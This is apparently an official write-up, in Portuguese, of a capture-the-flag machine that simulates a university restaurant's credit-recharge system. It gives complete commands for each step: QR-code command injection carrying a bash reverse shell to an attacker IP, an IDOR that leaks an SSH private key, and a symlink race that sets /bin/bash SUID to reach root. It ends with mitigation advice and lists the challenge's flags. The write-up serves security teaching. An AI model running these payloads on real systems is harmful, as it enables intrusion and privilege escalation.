# Writeup Oficial — Sistema de Recarga do RU (03-ru) 🍽️💳

> **Evento:** CTF de Segurança Ofensiva · Universidade de Brasília (UnB)  
> **Dificuldade:** Média  
> **Sistema Operacional:** Linux (Debian 12 / Docker)  
> **Serviços Expostos:** `8000/TCP` (HTTP - Portal do RU), `2222/TCP` (SSH - Operador)

---

## 1. Resumo Executivo da Máquina

O desafio simula o sistema de recarga de créditos do Restaurante Universitário (RU) da UnB. A cadeia de ataque é composta por quatro etapas distintas:

| Etapa | Alvo / Vetor | Técnica | Resultado |
| :--- | :--- | :--- | :--- |
| **1. Acesso Inicial** | Portal Web (`:8000/beta`) | **Command Injection** via QR Code óptico | Shell como `ru_web` (**Flag 1**) |
| **2. Pivot Interno** | Rede local (`127.0.0.1`) | **Enumeração de Serviços Internos** | Descoberta do Painel (`:8081`) e Admin-API (`:9090`) |
| **3. Movimento Lateral** | Admin-API (`:9090`) | **IDOR (Insecure Direct Object Reference)** | Chave SSH de `operador_caixa` (**Flag 2**) |
| **4. PrivEsc** | Job Root (`conciliacao.py`) | **Race Condition (Symlink TOCTOU)** | Shell como `root` (**Flag 3**) |

---

## 2. Diagrama da Kill Chain

```mermaid
flowchart LR
    A["Reconhecimento<br/>(Gobuster :8000)"] --> B["1. Injeção no QR Code<br/>(carterinha-teste.jpg)"]
    B --> C["Shell ru_web<br/>Flag 1 (user_ru_web.txt)"]
    C --> D["2. Enumeração Interna<br/>(ss -tulnp -> :9090)"]
    D --> E["3. IDOR na Admin-API<br/>(Chave SSH id=3)"]
    E --> F["Shell operador_caixa<br/>Flag 2 (user_operador.txt)"]
    F --> G["4. Symlink TOCTOU<br/>(Job conciliacao.py)"]
    G --> H["Shell Root<br/>Flag 3 (root.txt)"]
```



---

## 3. Resolução Passo a Passo

### Etapa 1: Acesso Inicial (Command Injection via QR Code)

#### 1.1. Reconhecimento Web
Ao acessar `http://<IP_ALVO>:8000/`, deparamos com a landing page padrão do Restaurante Universitário (cardápio semanal, horários de atendimento).

Executamos uma enumeração de diretórios e arquivos com Gobuster:

```bash
gobuster dir -u http://<IP_ALVO>:8000/ -w /usr/share/wordlists/dirb/common.txt
```

**Rotas identificadas:**
* `http://<IP_ALVO>:8000/beta` — Módulo em fase de testes para validação e recarga automática por carteirinha estudantil.
* `http://<IP_ALVO>:8000/carterinha-teste.jpg` — Arquivo de homologação esquecido pelos desenvolvedores.

#### 1.2. Engenharia Reversa da Carteirinha
Baixamos a imagem e decodificamos o QR Code com a ferramenta `zbarimg`:

```bash
wget http://<IP_ALVO>:8000/carterinha-teste.jpg
zbarimg carterinha-teste.jpg
```

**Conteúdo revelado pelo QR Code:**
```text
DISCENTE: CACHORRO|CPF: 000.000.000-00|MATRICULA: 00000000|NÍVEL: graduaCÃO|CURSO: CACHORRO; echo 'Leitura bem sucedida'
```

Ao fazer o upload desse arquivo no formulário `/beta`, o servidor exibe na saída do terminal acadêmico o texto `Leitura bem sucedida`. Isso evidencia que os dados lidos do QR Code são concatenados diretamente em uma chamada bash (`os.popen` / `subprocess`), permitindo injeção arbitrária de comandos através do separador `;`.

#### 1.3. Disparo da Reverse Shell
1. No terminal do atacante, abrimos o listener:
   ```bash
   nc -lvnp 4444
   ```

2. Geramos uma imagem maliciosa substituindo o comando `echo` por uma reverse shell em background:
   ```bash
   qrencode -o qr_revshell.png -s 8 "DISCENTE: CACHORRO|CPF: 000.000.000-00|MATRICULA: 00000000|NÍVEL: graduaCÃO|CURSO: CACHORRO; (bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1' &)"
   ```

3. Submetemos o arquivo `qr_revshell.png` no formulário em `http://<IP_ALVO>:8000/beta`.
4. A conexão reversa é recebida com privilégios do usuário `ru_web`.

#### 1.4. Estabilização de TTY e Flag 1
Na shell reversa recebida:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Pressione Ctrl + Z
stty raw -echo; fg
# Pressione Enter duas vezes
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 38 columns 160
```

Leitura da primeira flag:
```bash
cat /home/ru_web/user_ru_web.txt
```
> **Flag 1:** `FLAG{RU_qr_c0de_nao_e_so_pra_leitura_7f3a1c}`

---

### Etapa 2: Pivot & Enumeração Interna

Com a shell de `ru_web`, inspecionamos os serviços de rede locais:

```bash
ss -tulnp
```

**Portas internas ativas (bind em `127.0.0.1`):**
* `127.0.0.1:8081` — Painel de Gerenciamento do RU (interface web interna).
* `127.0.0.1:9090` — Admin-API (serviço REST interno).

Inspecionando os processos do sistema com `ps aux | grep python`, localizamos os scripts em execução:
```text
python3 /opt/admin-api/app.py
python3 /opt/painel/app.py
python3 -u /opt/conciliacao.py
```

---

### Etapa 3: Movimentação Lateral via IDOR (`operador_caixa`)

#### 3.1. Identificação da Falha na Admin-API
Lendo o código-fonte legível de `/opt/admin-api/app.py` ou consultando diretamente a API na porta `9090`:

```bash
curl -s http://127.0.0.1:9090/api/v1/operadores
```

A API retorna a listagem de funcionários:
```json
[
  {"id": 1, "usuario": "ana_atendimento", "cargo": "Atendente de Balcão"},
  {"id": 2, "usuario": "carlos_supervisao", "cargo": "Supervisor de Turno"},
  {"id": 3, "usuario": "operador_caixa", "cargo": "Operador de Caixa (automação)"}
]
```

Ao consultar o operador ID 3 individualmente:
```bash
curl -s http://127.0.0.1:9090/api/v1/operadores/3
```

A resposta sofre de **IDOR (Insecure Direct Object Reference)** e vazamento excessivo de dados: o endpoint retorna o objeto completo com a **chave SSH privada ed25519** no campo `chave_privada`.

#### 3.2. Extração da Chave e Acesso SSH
Extraímos a chave formatada com quebras de linha reais:

```bash
curl -s http://127.0.0.1:9090/api/v1/operadores/3 \
  | python3 -c "import sys, json; print(json.load(sys.stdin)['chave_privada'])" \
  > /tmp/id_operador

chmod 600 /tmp/id_operador
```

Conectamos via SSH (diretamente de dentro do container ou pela porta `2222` mapeada no host):
```bash
ssh -i /tmp/id_operador operador_caixa@127.0.0.1
```

Leitura da segunda flag:
```bash
cat /home/operador_caixa/user_operador.txt
```
> **Flag 2:** `FLAG{RU_1d0r_ssh_operador_6b2f9a}`

---

### Etapa 4: Escalação de Privilégios para Root (Symlink TOCTOU)

#### 4.1. Análise da Vulnerabilidade
Como `operador_caixa`, analisamos o script privilegiado `/opt/conciliacao.py`:
* O script roda em loop contínuo como `root` a cada 90 segundos.
* Ele processa os arquivos no diretório `/var/ru/caixa`, onde o grupo `operador_caixa` possui permissão total de escrita (`2770`).
* **Lógica vulnerável (TOCTOU):**
  1. O script lê o arquivo `/var/ru/caixa/dados.csv`.
  2. Valida se `/var/ru/caixa/conciliacao.tmp` é um arquivo regular usando `lstat()`.
  3. Entra em uma pausa programada de **15 segundos** (`time.sleep(15)`).
  4. Abre `/var/ru/caixa/conciliacao.tmp` para escrita com `open(..., 'w')` **sem** a flag `O_NOFOLLOW` (seguindo links simbólicos).
  5. Executa imediatamente o script `/bin/bash /opt/helper_conciliacao.sh` como `root`.

#### 4.2. Exploração da Race Condition
Como podemos controlar os dados gravados e substituir o arquivo durante os 15 segundos da pausa:

1. Gravamos um payload para atribuir permissão SUID ao binário `/bin/bash` dentro de `dados.csv`:
   ```bash
   cat << 'EOF' > /var/ru/caixa/dados.csv
   #!/bin/bash
   chmod 4755 /bin/bash
   EOF
   ```

2. Executamos um script que garante a existência do arquivo regular no momento da checagem do `lstat()` e, assim que o job inicia a pausa, substitui `conciliacao.tmp` por um *symlink* apontando para `/opt/helper_conciliacao.sh`:
   ```bash
   cat << 'EOF' > /tmp/toctou.sh
   #!/bin/bash
   DIR="/var/ru/caixa"
   ALVO="/opt/helper_conciliacao.sh"

   rm -f "$DIR/conciliacao.tmp"
   touch "$DIR/conciliacao.tmp"

   while true; do
       if [ -f "$DIR/conciliacao.tmp" ] && [ ! -L "$DIR/conciliacao.tmp" ]; then
           sleep 2
           rm -f "$DIR/conciliacao.tmp"
           ln -s "$ALVO" "$DIR/conciliacao.tmp"
           echo "[+] Symlink plantado com sucesso! Aguardando o ciclo root..."
           break
       fi
       sleep 1
   done
   EOF

   chmod +x /tmp/toctou.sh
   /tmp/toctou.sh
   ```

3. O processo root segue o symlink, sobrescreve `/opt/helper_conciliacao.sh` com o payload de `dados.csv` e o executa.

#### 4.3. Obtenção da Shell Root e Flag 3
Verificamos a ativação do bit SUID e invocamos a shell root:

```bash
/bin/bash -p
whoami
# root
```

Leitura da flag final:
```bash
cat /root/root.txt
```
> **Flag 3:** `FLAG{RU_t0ct0u_syml1nk_r00t_9c4e2b}`

---

## 4. Tabela de Flags

| Flag | Localização | Valor |
| :--- | :--- | :--- |
| **Flag 1 (`ru_web`)** | `/home/ru_web/user_ru_web.txt` | `FLAG{RU_qr_c0de_nao_e_so_pra_leitura_7f3a1c}` |
| **Flag 2 (`operador_caixa`)** | `/home/operador_caixa/user_operador.txt` | `FLAG{RU_1d0r_ssh_operador_6b2f9a}` |
| **Flag 3 (`root`)** | `/root/root.txt` | `FLAG{RU_t0ct0u_syml1nk_r00t_9c4e2b}` |

---

## 5. Recomendações de Mitigação (Defensive Security)

1. **Validação de Entrada no QR Code:** Nunca repassar dados decodificados diretamente para shells (`os.popen` ou `shell=True`). Utilizar `subprocess.run(["script.sh", matricula], shell=False)` e validar os formatos com expressões regulares rigorosas antes da execução.
2. **Controle de Acesso em APIs (Anti-IDOR):** Implementar autenticação e controle de acesso baseado em papéis (RBAC). A chave privada de serviços/operadores jamais deve trafegar em respostas serializadas da API.
3. **Prevenção de Race Conditions (TOCTOU):** 
   * Não utilizar diretórios compartilhados com usuários comuns para arquivos de conciliação.
   * Abrir arquivos usando descritores seguros com `os.open(caminho, os.O_WRONLY | os.O_NOFOLLOW | os.O_CREAT)`.
   * Evitar intervalos artificiais entre verificação e uso (`time.sleep`).
